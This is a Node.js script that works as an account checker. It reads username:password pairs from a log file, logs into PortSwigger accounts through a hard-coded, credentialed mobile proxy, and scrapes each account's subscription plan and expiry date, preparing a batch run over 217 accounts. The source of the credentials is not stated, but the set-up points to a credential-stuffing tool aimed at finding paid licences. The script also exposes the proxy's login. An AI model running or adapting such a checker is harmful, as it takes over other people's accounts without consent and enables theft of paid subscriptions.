#!/usr/bin/env node

/**
 * Test single account subscription extraction (Windows compatible)
 * Uses temp file for POST data to avoid shell escaping issues
 */

const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

const PROXY = 'http://buymobileproxycom:mugla9392@ankara8.buymobileproxy.com:8029';

// Parse first account from log.txt
const logFile = fs.readFileSync('log.txt', 'utf-8');
const [username, password] = logFile.split('\n')[0].trim().split(':').map(x => x.trim());

console.log(`[*] Testing account: ${username}\n`);

// Curl helper - Windows compatible
function curl(url, post = null) {
    try {
        let cmd;
        if (post) {
            // For POST requests, write data to temp file to avoid escaping issues
            const tempFile = path.join(require('os').tmpdir(), `curl_data_${Date.now()}.txt`);
            const data = Object.entries(post).map(([k,v]) => `${k}=${v}`).join('&');
            fs.writeFileSync(tempFile, data);

            cmd = `curl -s -i -x "${PROXY}" -X POST -d @"${tempFile}" "${url}"`;

            try {
                const output = execSync(cmd, { encoding: 'utf-8', shell: true, maxBuffer: 50*1024*1024, timeout: 35000 });
                fs.unlinkSync(tempFile); // Clean up temp file
                return parseResponse(output);
            } catch (e) {
                try { fs.unlinkSync(tempFile); } catch {}
                throw e;
            }
        } else {
            // GET request
            cmd = `curl -s -i -x "${PROXY}" --connect-timeout 10 --max-time 20 "${url}"`;
            const output = execSync(cmd, { encoding: 'utf-8', shell: true, maxBuffer: 50*1024*1024, timeout: 35000 });
            return parseResponse(output);
        }
    } catch (e) {
        console.error(`[!] Curl error: ${e.message.substring(0, 100)}`);
        return { status: 0, body: '', location: null };
    }
}

function parseResponse(output) {
    const parts = output.split('\r\n\r\n');
    const body = parts.slice(1).join('\r\n\r\n');
    const status = parseInt(parts[0].match(/HTTP\/\d\.\d (\d+)/)?.[1] || 0);
    const loc = parts[0].match(/[Ll]ocation:\s*([^\r\n]+)/)?.[1]?.trim();
    return { status, body, location: loc };
}

// Step 1: OAuth authorize endpoint
console.log('[1] Fetching OAuth authorize endpoint...');
let r = curl('https://login.portswigger.net/authorize?client_id=F1PNGMosqeuuNO5cKQzDesrY2XzvPWGz&redirect_uri=https://portswigger.net/signin-oidc&response_type=code&scope=openid+profile+email&code_challenge=BldXYnkHHNxMQttliGBK-tWU16bEzTbKyUsr9WnArgk&code_challenge_method=S256&response_mode=query');
console.log(`    Status: ${r.status}`);

let state = r.location?.match(/state=([^&]+)/)?.[1] || '';
console.log(`    State: ${state.substring(0, 20)}...`);

if (!state) {
    console.error('[!] Failed to extract state parameter');
    process.exit(1);
}

// Step 2: Login with username/password
console.log('\n[2] Logging in...');
r = curl(`https://login.portswigger.net/u/login${state ? '?state='+state : ''}`, {
    username: username,
    password: password,
    action: 'default'
});
console.log(`    Status: ${r.status}`);

let url = r.location;
if (!url) {
    console.error('[!] Login failed - no redirect location');
    process.exit(1);
}

// Step 3: Follow redirects
console.log('\n[3] Following login redirects...');
for (let i = 0; i < 15 && url; i++) {
    if (!url.startsWith('http')) url = 'https://login.portswigger.net' + url;
    r = curl(url);
    console.log(`    Redirect ${i+1}: ${r.status} -> ${r.location?.substring(0, 50) || 'done'}`);
    url = r.location;
    if (url?.includes('portswigger.net') && !url.includes('login')) break;
}

console.log('\n[✓] Logged in successfully\n');

// Step 4: Fetch subscription page
console.log('[4] Fetching subscription page...');
r = curl('https://portswigger.net/#/my-account');
console.log(`    Page size: ${r.body.length} bytes`);

// Step 5: Extract subscription info
console.log('\n[5] Parsing subscription data...');
const html = r.body;

let plan = 'Unknown';
let subscription = 'Unknown';

if (!html || html.length < 100) {
    console.log('    [!] Empty response');
} else if (html.includes('You do not have any subscriptions')) {
    subscription = 'None';
    plan = 'Free/Community';
    console.log('    [✓] No subscriptions found');
} else {
    subscription = 'Active';

    // Check for plan type
    if (html.toLowerCase().includes('enterprise')) {
        plan = 'Enterprise';
        console.log('    [✓] Found: Enterprise');
    } else if (html.toLowerCase().includes('team')) {
        plan = 'Team';
        console.log('    [✓] Found: Team');
    } else if (html.toLowerCase().includes('professional')) {
        plan = 'Professional';
        console.log('    [✓] Found: Professional');
    } else if (html.toLowerCase().includes('community')) {
        plan = 'Community';
        console.log('    [✓] Found: Community');
    } else {
        plan = 'Unknown (subscription active)';
        console.log('    [?] Subscription active but plan not detected');
    }
}

// Extract expiry dates
const datePattern = /(\d{1,2}[\/\-]\d{1,2}[\/\-]\d{2,4})|(\d{4}[\/\-]\d{1,2}[\/\-]\d{1,2})/g;
const dates = html.match(datePattern);
const expiry = dates ? dates[0] : null;

if (expiry) {
    console.log(`    [✓] Expiry: ${expiry}`);
}

// Step 6: Display results
console.log('\n' + '='.repeat(60));
console.log('RESULTS:');
console.log('='.repeat(60));
console.log(`Username:     ${username}`);
console.log(`Plan:         ${plan}`);
console.log(`Subscription: ${subscription}`);
if (expiry) console.log(`Expiry:       ${expiry}`);
console.log('='.repeat(60));

// Step 7: Save results
const result = {
    username: username,
    plan: plan,
    subscription: subscription,
    expiry: expiry,
    status: 'OK',
    timestamp: new Date().toISOString()
};

fs.writeFileSync('test_result.json', JSON.stringify(result, null, 2));
console.log('\n[✓] Saved: test_result.json');
console.log('\n[✓] Test completed successfully!\n');

if (plan === 'Unknown' || plan === 'Unknown (subscription active)') {
    console.log('[!] WARNING: Could not determine subscription plan');
    console.log('    This might be due to:');
    console.log('    - Different HTML structure than expected');
    console.log('    - Keywords not present in response');
    console.log('    - JavaScript-rendered content not in initial HTML');
    console.log('\n    Check test_result.json for full response analysis');
} else {
    console.log('[✓] Plan extraction confirmed working!');
    console.log('    Ready to process all 217 accounts with batch_subscription_extractor.js\n');
}
